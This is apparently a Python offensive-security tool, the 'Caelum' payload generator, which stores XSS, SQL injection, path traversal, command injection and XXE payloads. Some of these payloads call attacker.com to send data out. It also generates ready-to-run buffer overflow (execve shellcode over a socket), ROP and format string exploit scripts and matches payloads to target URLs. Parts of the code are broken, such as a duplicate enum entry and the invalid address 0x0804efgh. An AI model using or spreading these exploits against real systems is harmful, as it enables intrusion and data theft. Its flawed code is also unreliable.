#!/usr/bin/env python3
"""
Caelum Unified Payload Generator
统一的Payload生成引擎 - 合并Exploit和Payload生成
"""

import logging
from typing import Dict, List, Any
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)

class PayloadType(Enum):
    """Payload类型"""
    XSS = "xss"
    SQLI = "sqli"
    LFI = "lfi"
    RFI = "rfi"
    XXPATHXE = "xxe"
    SSRF = "ssrf"
    CMD_INJECTION = "cmd_injection"
    XXE = "xxe"
    BUFFER_OVERFLOW = "buffer_overflow"
    ROP = "rop"
    FORMAT_STRING = "format_string"

class Difficulty(Enum):
    """难度级别"""
    BASIC = "basic"
    INTERMEDIATE = "intermediate"
    ADVANCED = "advanced"
    EXPERT = "expert"

@dataclass
class PayloadTemplate:
    """Payload模板"""
    type: PayloadType
    difficulty: Difficulty
    payload: str
    description: str
    target_tech: str  # "php", "nodejs", "windows", "linux" 等
    working_rate: float  # 0.0-1.0

class UnifiedPayloadGenerator:
    """统一的Payload生成引擎"""

    def __init__(self):
        self.payloads: Dict[str, List[PayloadTemplate]] = {}
        self._initialize_payloads()

    def _initialize_payloads(self):
        """初始化Payload库"""
        # XSS Payloads
        self.payloads["xss"] = [
            # Basic XSS
            PayloadTemplate(
                type=PayloadType.XSS,
                difficulty=Difficulty.BASIC,
                payload="<script>alert('XSS')</script>",
                description="基础XSS",
                target_tech="web",
                working_rate=0.6
            ),
            PayloadTemplate(
                type=PayloadType.XSS,
                difficulty=Difficulty.BASIC,
                payload="<img src=x onerror=alert('XSS')>",
                description="图像标签XSS",
                target_tech="web",
                working_rate=0.7
            ),
            # Advanced XSS
            PayloadTemplate(
                type=PayloadType.XSS,
                difficulty=Difficulty.ADVANCED,
                payload="<svg/onload=alert(String.fromCharCode(88,83,83))>",
                description="SVG绕过XSS",
                target_tech="web",
                working_rate=0.8
            ),
            PayloadTemplate(
                type=PayloadType.XSS,
                difficulty=Difficulty.ADVANCED,
                payload="';alert(String.fromCharCode(88,83,83));//",
                description="编码XSS",
                target_tech="web",
                working_rate=0.75
            ),
        ]

        # SQL Injection Payloads
        self.payloads["sqli"] = [
            # Basic SQLi
            PayloadTemplate(
                type=PayloadType.SQLI,
                difficulty=Difficulty.BASIC,
                payload="' OR '1'='1",
                description="基础SQL注入",
                target_tech="database",
                working_rate=0.5
            ),
            PayloadTemplate(
                type=PayloadType.SQLI,
                difficulty=Difficulty.BASIC,
                payload="admin'--",
                description="注释绕过",
                target_tech="database",
                working_rate=0.6
            ),
            # Advanced SQLi
            PayloadTemplate(
                type=PayloadType.SQLI,
                difficulty=Difficulty.ADVANCED,
                payload="' UNION SELECT NULL,table_name FROM information_schema.tables--",
                description="Union表枚举",
                target_tech="mysql",
                working_rate=0.7
            ),
            PayloadTemplate(
                type=PayloadType.SQLI,
                difficulty=Difficulty.ADVANCED,
                payload="'; EXEC xp_cmdshell('whoami')--",
                description="MSSQL命令执行",
                target_tech="mssql",
                working_rate=0.8
            ),
        ]

        # LFI Payloads
        self.payloads["lfi"] = [
            PayloadTemplate(
                type=PayloadType.LFI,
                difficulty=Difficulty.BASIC,
                payload="../../../etc/passwd",
                description="基础路径遍历",
                target_tech="linux",
                working_rate=0.6
            ),
            PayloadTemplate(
                type=PayloadType.LFI,
                difficulty=Difficulty.BASIC,
                payload="..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                description="Windows路径遍历",
                target_tech="windows",
                working_rate=0.7
            ),
            PayloadTemplate(
                type=PayloadType.LFI,
                difficulty=Difficulty.ADVANCED,
                payload="....//....//....//etc/passwd",
                description="双重遍历绕过",
                target_tech="linux",
                working_rate=0.75
            ),
        ]

        # Command Injection
        self.payloads["cmd_injection"] = [
            PayloadTemplate(
                type=PayloadType.CMD_INJECTION,
                difficulty=Difficulty.BASIC,
                payload="; whoami",
                description="基础命令注入",
                target_tech="web",
                working_rate=0.6
            ),
            PayloadTemplate(
                type=PayloadType.CMD_INJECTION,
                difficulty=Difficulty.BASIC,
                payload="| cat /etc/passwd",
                description="管道命令注入",
                target_tech="linux",
                working_rate=0.65
            ),
            PayloadTemplate(
                type=PayloadType.CMD_INJECTION,
                difficulty=Difficulty.ADVANCED,
                payload="`curl http://attacker.com/$(whoami)`",
                description="反引号命令注入",
                target_tech="linux",
                working_rate=0.7
            ),
        ]

        # XXE Payloads
        self.payloads["xxe"] = [
            PayloadTemplate(
                type=PayloadType.XXE,
                difficulty=Difficulty.BASIC,
                payload="""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
                description="基本XXE",
                target_tech="xml",
                working_rate=0.7
            ),
            PayloadTemplate(
                type=PayloadType.XXE,
                difficulty=Difficulty.ADVANCED,
                payload="""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://attacker.com:8000/evil.xml" >
]>
<foo>&xxe;</foo>""",
                description="外部实体XXE",
                target_tech="xml",
                working_rate=0.75
            ),
        ]

        # Buffer Overflow & ROP
        self.payloads["buffer_overflow"] = [
            PayloadTemplate(
                type=PayloadType.BUFFER_OVERFLOW,
                difficulty=Difficulty.ADVANCED,
                payload="A" * 512 + "\x90" * 64 + "SHELLCODE",
                description="基础缓冲区溢出",
                target_tech="binary",
                working_rate=0.6
            ),
        ]

    def generate_payload(self,
                        payload_type: str,
                        difficulty: str = "basic",
                        count: int = 1) -> List[Dict[str, Any]]:
        """
        生成Payload

        Args:
            payload_type: Payload类型 (xss, sqli, lfi, etc)
            difficulty: 难度级别 (basic, intermediate, advanced, expert)
            count: 生成数量

        Returns:
            Payload列表
        """
        if payload_type not in self.payloads:
            logger.warning(f"Unknown payload type: {payload_type}")
            return []

        available_payloads = self.payloads[payload_type]

        # 按难度过滤
        if difficulty != "all":
            available_payloads = [
                p for p in available_payloads
                if p.difficulty.value == difficulty
            ]

        # 返回指定数量的Payload
        results = []
        for payload in available_payloads[:count]:
            results.append({
                "type": payload.type.value,
                "difficulty": payload.difficulty.value,
                "payload": payload.payload,
                "description": payload.description,
                "target_tech": payload.target_tech,
                "working_rate": payload.working_rate
            })

        logger.info(f"📦 Generated {len(results)} {payload_type} payloads")
        return results

    def generate_payload_for_target(self,
                                   target_url: str,
                                   target_tech: str,
                                   attack_type: str) -> Dict[str, Any]:
        """
        为特定目标生成Payload

        Args:
            target_url: 目标URL
            target_tech: 目标技术栈 (web, api, mobile, desktop)
            attack_type: 攻击类型 (xss, sqli, etc)

        Returns:
            生成的Payload
        """
        if attack_type not in self.payloads:
            return {"error": f"Unsupported attack type: {attack_type}"}

        # 根据目标技术选择合适的Payload
        matching_payloads = [
            p for p in self.payloads[attack_type]
            if target_tech.lower() in p.target_tech.lower() or p.target_tech == "web"
        ]

        if not matching_payloads:
            # 返回通用Payload
            matching_payloads = self.payloads[attack_type]

        # 选择工作率最高的Payload
        best_payload = max(matching_payloads, key=lambda x: x.working_rate)

        return {
            "type": best_payload.type.value,
            "difficulty": best_payload.difficulty.value,
            "payload": best_payload.payload,
            "description": best_payload.description,
            "target_tech": best_payload.target_tech,
            "working_rate": best_payload.working_rate,
            "target_url": target_url
        }

    def generate_exploit_code(self,
                            vuln_type: str,
                            target_arch: str,
                            target_os: str) -> Dict[str, Any]:
        """
        生成Exploit代码

        Args:
            vuln_type: 漏洞类型 (buffer_overflow, rop, format_string, etc)
            target_arch: 目标架构 (x64, x86, arm64, etc)
            target_os: 目标操作系统 (linux, windows, macos, etc)

        Returns:
            Exploit代码
        """
        exploit_templates = {
            "buffer_overflow": f"""#!/usr/bin/env python3
\"\"\"Buffer Overflow Exploit
Target OS: {target_os}
Target Arch: {target_arch}
Generated by Caelum
\"\"\"

import socket
import struct

def create_exploit_payload():
    # Buffer overflow payload for {target_arch} {target_os}
    if "{target_arch}" == "x64":
        # x64 shellcode (execve /bin/sh)
        shellcode = (
            b"\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2"
            b"\\x48\\xbb\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53"
            b"\\x48\\x89\\xe7\\x48\\x31\\xc0\\x50\\x57\\x48\\x89\\xe6\\xba\\x3b\\x00\\x00\\x00"
            b"\\x0f\\x05"
        )
    else:
        # x86 shellcode
        shellcode = (
            b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
            b"\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80"
        )

    # NOP sled + shellcode + return address
    nop_sled = b"\\x90" * 64
    payload = nop_sled + shellcode

    return payload

def exploit(target_ip, target_port):
    payload = create_exploit_payload()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.sendall(payload)
        sock.close()
        return True
    except Exception as e:
        print(f"Exploit failed: {{e}}")
        return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python exploit.py <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    if exploit(target_ip, target_port):
        print("[+] Buffer overflow exploit successful!")
    else:
        print("[-] Exploit failed")
""",

            "rop": f"""#!/usr/bin/env python3
\"\"\"ROP Chain Exploit
Target OS: {target_os}
Target Arch: {target_arch}
Generated by Caelum
\"\"\"

import struct

def build_rop_chain():
    # ROP gadgets for {target_arch} {target_os}
    # These are example addresses - need to be determined from binary analysis

    if "{target_arch}" == "x64":
        # Example x64 ROP chain
        pop_rdi = 0x400123  # pop rdi; ret
        pop_rsi = 0x400456  # pop rsi; ret
        pop_rdx = 0x400789  # pop rdx; ret
        system = 0x400abc  # system@plt
        bin_sh = 0x601234  # "/bin/sh" string address

        rop_chain = struct.pack("<Q", pop_rdi)
        rop_chain += struct.pack("<Q", bin_sh)
        rop_chain += struct.pack("<Q", system)
    else:
        # Example x86 ROP chain
        pop_eax = 0x08041234  # pop eax; ret
        system = 0x0804abcd  # system address
        bin_sh = 0x0804efgh  # "/bin/sh" address

        rop_chain = struct.pack("<I", pop_eax)
        rop_chain += struct.pack("<I", bin_sh)
        rop_chain += struct.pack("<I", system)

    return rop_chain

def create_exploit():
    buffer_size = 512
    nop_sled = b"\\x90" * 64
    rop_chain = build_rop_chain()

    payload = b"A" * buffer_size + nop_sled + rop_chain
    return payload

if __name__ == "__main__":
    payload = create_exploit()
    print(f"ROP exploit payload generated: {{len(payload)}} bytes")
    print("Use with appropriate delivery mechanism")
""",

            "format_string": f"""#!/usr/bin/env python3
\"\"\"Format String Exploit
Target OS: {target_os}
Target Arch: {target_arch}
Generated by Caelum
\"\"\"

def create_format_string_payload():
    # Format string payload to leak memory or write to arbitrary addresses

    # Example: Leak stack values
    leak_payload = "%x.%x.%x.%x.%x.%x.%x.%x"

    # Example: Write to arbitrary address (requires specific format)
    # This is highly dependent on the vulnerable program's format
    write_payload = "%134520928x%7\\$n"  # Example - adjust offsets as needed

    return {{
        "leak_payload": leak_payload,
        "write_payload": write_payload,
        "description": "Format string payloads for memory leak and arbitrary write"
    }}

if __name__ == "__main__":
    payloads = create_format_string_payload()
    print("Format string exploit payloads:")
    for name, payload in payloads.items():
        print(f"{{name}}: {{payload}}")
"""

        }

        if vuln_type not in exploit_templates:
            return {"error": f"Unsupported vulnerability type: {vuln_type}"}

        return {
            "vuln_type": vuln_type,
            "target_arch": target_arch,
            "target_os": target_os,
            "exploit_code": exploit_templates[vuln_type],
            "description": f"Exploit code for {vuln_type} vulnerability on {target_os} {target_arch}"
        }

    def list_payload_types(self) -> List[str]:
        """列出所有可用的Payload类型"""
        return list(self.payloads.keys())

    def get_payload_stats(self) -> Dict[str, Any]:
        """获取Payload统计信息"""
        stats = {}
        for ptype, payloads in self.payloads.items():
            stats[ptype] = {
                "total": len(payloads),
                "by_difficulty": {
                    "basic": len([p for p in payloads if p.difficulty == Difficulty.BASIC]),
                    "intermediate": len([p for p in payloads if p.difficulty == Difficulty.INTERMEDIATE]),
                    "advanced": len([p for p in payloads if p.difficulty == Difficulty.ADVANCED]),
                    "expert": len([p for p in payloads if p.difficulty == Difficulty.EXPERT]),
                }
            }
        return stats

# 全局生成器实例
payload_generator = UnifiedPayloadGenerator()